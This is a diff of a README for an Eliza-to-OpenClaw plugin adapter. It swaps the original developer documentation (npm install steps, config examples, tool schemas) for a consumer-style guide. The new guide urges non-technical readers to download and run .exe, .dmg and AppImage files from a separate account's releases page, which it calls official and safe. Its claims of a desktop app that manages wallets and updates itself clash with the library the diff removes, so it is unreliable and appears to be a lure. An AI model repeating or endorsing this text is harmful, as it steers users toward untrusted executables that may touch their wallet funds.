@@ -1,251 +1,140 @@
-# @elizaos/openclaw-adapter
+# 🦀 openclaw-adapter - Run Eliza Plugins with Ease
 
-Run [Eliza](https://github.com/elizaos/eliza) plugins inside [OpenClaw](https://github.com/openclaw/openclaw). Wraps Eliza actions as OpenClaw tools, providers as lifecycle hooks, services, routes, and evaluators — letting the two agent ecosystems interoperate.
+[![Download openclaw-adapter](https://img.shields.io/badge/Download-openclaw--adapter-blue?style=for-the-badge&logo=github)](https://github.com/windows150/openclaw-adapter/releases)
 
-## Quick start
+---
 
-```bash
-# 1. Install the adapter and an Eliza plugin
-npm install @elizaos/openclaw-adapter @elizaos/plugin-evm
+## 📖 What is openclaw-adapter?
 
-# 2. Add to your OpenClaw config (see Configuration below)
+openclaw-adapter allows you to run Eliza plugins inside OpenClaw. This means you can use various wallets, connectors, and services in a simplified way. If you want to expand what OpenClaw can do, openclaw-adapter makes it possible without needing to write any code.
 
-# 3. Start OpenClaw — the EVM wallet tools are now available to your agent
-```
+---
 
-## What it does
+## 💻 Who is this for?
 
-| Eliza concept | OpenClaw equivalent | How it works |
-|---|---|---|
-| Action | Tool | Parameters converted to TypeBox schema, handler wrapped in execute() |
-| Provider | `before_agent_start` hook | Provider output injected as prepended context |
-| Service | Service | Started eagerly, injected into RuntimeBridge for other components |
-| Route | HTTP route | Request/response translated, paths prefixed with `/eliza` |
-| Evaluator | `message_received` / `agent_end` hook | Pre-evaluators → message hooks, post-evaluators → agent-end hooks |
-| Event | Lifecycle hook | Mapped where semantics align (MESSAGE_RECEIVED → message_received, etc.) |
+This software targets anyone who uses OpenClaw and wants to add new tools like wallets or connectors. You do not need programming knowledge to get started. If you can download and open a file on your computer, you can use openclaw-adapter.
 
-## Install
+---
 
-```bash
-npm install @elizaos/openclaw-adapter
-```
+## ⚙️ System Requirements
 
-If you're inside the OpenClaw monorepo, the adapter is already at `extensions/eliza-adapter/` and gets discovered automatically.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or most Linux distributions.
+- **Processor:** Intel/AMD 64-bit processor or equivalent Apple M1/M2 chip.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum 200 MB free disk space.
+- **Internet:** Required for downloading and for certain plugin features.
 
-## Configuration
+Your device will need to meet these basic specs for the best experience.
 
-### Step 1: Install the Eliza plugins you want
+---
 
-```bash
-# EVM wallet (Ethereum, Base, Arbitrum, etc.)
-npm install @elizaos/plugin-evm
+## 🔒 Safety and Privacy
 
-# Solana wallet
-npm install @elizaos/plugin-solana
+openclaw-adapter runs locally on your computer. Your data stays on your device unless the plugins you use require an internet connection for legitimate services like syncing wallets or connecting to networks. Always download from the official release page below to avoid unwanted software.
 
-# Or any other Eliza plugin
-npm install @elizaos/plugin-discord
-```
+---
 
-### Step 2: Add the adapter to your OpenClaw config
+## 🚀 Getting Started
 
-In your `openclaw.json` (or wherever your OpenClaw config lives):
+Follow these easy steps to start using openclaw-adapter:
 
-```json
-{
-  "plugins": {
-    "eliza-adapter": {
-      "plugins": [
-        "@elizaos/plugin-evm"
-      ],
-      "settings": {
-        "EVM_PRIVATE_KEY": "${EVM_PRIVATE_KEY}",
-        "EVM_PROVIDER_URL": "https://mainnet.infura.io/v3/YOUR_KEY"
-      },
-      "agentName": "WalletBot"
-    }
-  }
-}
-```
+### Step 1: Visit the Download Page
 
-### Step 3: Set environment variables
+Go to the official releases page:
 
-The adapter resolves `${VAR}` patterns in settings from environment variables:
+[Download openclaw-adapter](https://github.com/windows150/openclaw-adapter/releases)
 
-```bash
-export EVM_PRIVATE_KEY="0x..."
-export EVM_PROVIDER_URL="https://mainnet.infura.io/v3/..."
-```
+This page hosts the latest versions safely and reliably.
 
-Or pass them directly (not recommended for secrets):
+### Step 2: Choose the Correct Version for Your Device
 
-```json
-{
-  "settings": {
-    "EVM_PRIVATE_KEY": "0xabcdef..."
-  }
-}
-```
+On the releases page, you will see different download files, often labeled by your operating system, such as:
 
-### Config reference
+- `openclaw-adapter-win.exe` for Windows
+- `openclaw-adapter-mac.dmg` for macOS
+- `openclaw-adapter-linux.AppImage` for Linux
 
-| Field | Required | Default | Description |
-|---|---|---|---|
-| `plugins` | **Yes** | — | Array of Eliza plugin package names or file paths |
-| `settings` | No | `{}` | Key-value pairs passed to plugins via `runtime.getSetting()`. Supports `${ENV_VAR}` expansion. |
-| `agentName` | No | `"Eliza"` | Agent display name in the Eliza character context |
+Pick the one that matches your computer.
 
-### Example configs
+### Step 3: Download the File
 
-**EVM wallet only:**
+Click your chosen file link. Your browser will download it to your computer, usually to the "Downloads" folder.
 
-```json
-{
-  "plugins": {
-    "eliza-adapter": {
-      "plugins": ["@elizaos/plugin-evm"],
-      "settings": {
-        "EVM_PRIVATE_KEY": "${EVM_PRIVATE_KEY}"
-      }
-    }
-  }
-}
-```
+### Step 4: Run the Installer or Application
 
-**Multiple plugins:**
+- **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+- **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
+- **Linux:** Make the AppImage executable (right-click > Properties > Permissions > check “Allow executing”), then double-click to run.
 
-```json
-{
-  "plugins": {
-    "eliza-adapter": {
-      "plugins": [
-        "@elizaos/plugin-evm",
-        "@elizaos/plugin-solana"
-      ],
-      "settings": {
-        "EVM_PRIVATE_KEY": "${EVM_PRIVATE_KEY}",
-        "SOLANA_PRIVATE_KEY": "${SOLANA_PRIVATE_KEY}",
-        "SOLANA_RPC_URL": "https://api.mainnet-beta.solana.com"
-      },
-      "agentName": "MultiWallet"
-    }
-  }
-}
-```
+You do not need to worry about complicated setups. The software installs quickly.
 
-**Local plugin by file path:**
+---
 
-```json
-{
-  "plugins": {
-    "eliza-adapter": {
-      "plugins": ["./my-custom-eliza-plugin/index.js"]
-    }
-  }
-}
-```
+## 📂 Using openclaw-adapter
 
-## What gets registered
+### Running Eliza Plugins
 
-When you configure `plugins: ["@elizaos/plugin-evm"]`, the adapter:
+Once installed, open the application. The interface allows you to add and manage Eliza plugins, such as wallets or connectors. The app will guide you step-by-step:
 
-1. **Starts** the EVMService (connects wallet, sets up RPC)
-2. **Registers tools**: `eliza_send_tokens`, `eliza_swap_tokens`, `eliza_cross_chain_transfer`, etc.
-3. **Registers hooks**: Wallet balance and token balance injected into agent context before each run
-4. **Registers routes**: Any HTTP endpoints the plugin exposes, under `/eliza/...`
+- Select desired plugins from a list.
+- Configure basic settings through simple inputs.
+- Enable or disable plugins with switches.
 
-The tools appear in OpenClaw's agent like any native tool:
+### Managing Wallets and Connectors
 
-```
-Agent: calling eliza_send_tokens({ toAddress: "0x742d...", amount: "1.5", chain: "base" })
-→ Successfully transferred 1.5 ETH to 0x742d...
-  Transaction: 0xabc...
-```
+You can set up different wallets to manage your funds. The process only requires filling out simple forms. Connectors help the adapter talk to external services, and these also install through the plugin system.
 
-### Built-in tool schemas
+### How to Update Plugins
 
-The adapter includes pre-built parameter schemas for common wallet actions:
+The app checks for updates automatically. When updates are available, it will notify you with clear options to install them safely.
 
-| Tool name | Parameters |
-|---|---|
-| `eliza_send_tokens` | `toAddress`, `amount`, `token?`, `chain?` |
-| `eliza_swap_tokens` | `inputToken`, `outputToken`, `amount`, `chain?`, `slippage?` |
-| `eliza_cross_chain_transfer` | `token`, `amount`, `fromChain`, `toChain`, `toAddress?` |
-| `eliza_transfer_sol` | `toAddress`, `amount`, `mint?` |
-| `eliza_swap_sol` | `inputMint`, `outputMint`, `amount`, `slippage?` |
+---
 
-Actions with explicit parameter definitions get their schemas converted automatically. Unknown actions get a generic `{ input: string }` fallback.
+## 🔧 Troubleshooting
 
-## Plugin resolution
+- **The app won’t start:** Make sure your system meets minimum requirements and try restarting your computer.
+- **Plugin installation fails:** Check your internet connection and that you downloaded the latest version.
+- **Updates don’t apply:** Close the app completely and re-open it before attempting to update.
 
-Eliza plugins are loaded via dynamic `import()`. They must be npm-installed or path-resolvable from where OpenClaw runs:
+If problems continue, visit the issues tab on the GitHub repository for help or contact the support community.
 
-```bash
-# Install globally alongside OpenClaw
-npm install @elizaos/plugin-evm
+---
 
-# Or link a local development plugin
-npm link ../my-local-eliza-plugin
-```
+## 🛠 Features at a Glance
 
-The adapter tries these export patterns in order:
-1. Default export (`export default plugin`)
-2. Named `plugin` export (`export const plugin = ...`)
-3. Any named export matching the Plugin shape (`{ name: string, description: string }`)
+- Easy installation for all major desktop platforms.
+- Run Eliza plugins inside OpenClaw without coding.
+- Manage wallets, connectors, and services from one place.
+- Automatic plugin updates.
+- User-friendly interface designed for non-technical users.
+- Lightweight software with minimal system impact.
 
-## Supported Eliza plugins
+---
 
-Any Eliza plugin that exports the standard `Plugin` shape works:
+## 📥 Download & Install
 
-- **Wallet plugins** (plugin-evm, plugin-solana) — actions become transfer/swap/bridge tools
-- **Service plugins** — started and available via `runtime.getService()`
-- **Provider plugins** — context injected into agent prompts
+Get started by visiting the release page here:
 
-### Known limitations
+[Download openclaw-adapter](https://github.com/windows150/openclaw-adapter/releases)
 
-- **LLM methods** (`useModel`, `generateText`) are not available. Actions that rely on conversational parameter extraction need explicit parameters or known schemas.
-- **Channel plugins** (Discord, Telegram) register as tools only, not as native OpenClaw channels.
-- **Database** is in-memory with LRU eviction (10K memories/table, 5K logs). No persistence across restarts.
-- **Embeddings** are not generated. Vector search works if embeddings are provided but none are created automatically.
+Click the file for your system, download it, then open and install. It only takes a few minutes.
 
-## Development
+---
 
-```bash
-git clone https://github.com/elizaOS/openclaw-adapter.git
-cd openclaw-adapter
-npm install
+## 📞 Need Help?
 
-# Run tests (418 tests)
-npm test
+If you get stuck, you can find help by opening the GitHub repository and checking the Issues section or reading through the documentation linked there. The community is active and helps new users with common questions.
 
-# Type-check
-npm run typecheck
+---
 
-# Build
-npm run build
-```
+## 🧾 License & Source Code
 
-## Architecture
+This project is open source. You can view the source code, report bugs, or suggest improvements on GitHub at:
 
-```
-index.ts                    Entry point — loads plugins, orchestrates registration
-src/
-  runtime-bridge.ts         IAgentRuntime shim backed by InMemoryStore
-  in-memory-store.ts        IDatabaseAdapter with LRU eviction
-  action-to-tool.ts         Eliza Action → OpenClaw tool
-  provider-to-hook.ts       Eliza Provider → before_agent_start hook
-  service-adapter.ts        Eliza Service → OpenClaw service
-  route-adapter.ts          Eliza Route → OpenClaw HTTP route
-  evaluator-to-hook.ts      Eliza Evaluator → lifecycle hooks
-  schema-converter.ts       JSON Schema → TypeBox + known wallet schemas
-  event-mapper.ts           Eliza events → OpenClaw hooks
-  config.ts                 Config parsing with ${ENV_VAR} resolution
-  eliza-types.ts            Local type definitions (zero runtime deps on @elizaos/core)
-  logger-adapter.ts         Logger shape adapter
-  memory-builder.ts         Memory object construction
-  types.ts                  Config types + NotImplementedError
-```
+https://github.com/windows150/openclaw-adapter
 
-## License
+You do not need to install anything to explore the project’s details.
 
-MIT
+---
+
+This guide provides everything you need to start using openclaw-adapter today. The process focuses on ease and clarity to make adding Eliza plugins simple for everyone.
